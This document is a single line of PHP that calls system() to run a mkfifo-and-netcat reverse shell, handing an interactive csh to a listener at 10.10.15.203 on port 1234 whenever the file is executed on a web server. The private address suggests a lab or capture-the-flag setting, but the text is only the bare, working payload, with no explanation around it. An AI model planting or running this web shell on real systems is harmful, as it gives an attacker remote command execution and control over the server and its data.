<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/csh -i 2>&1|nc 10.10.15.203 1234 >/tmp/f"); ?>
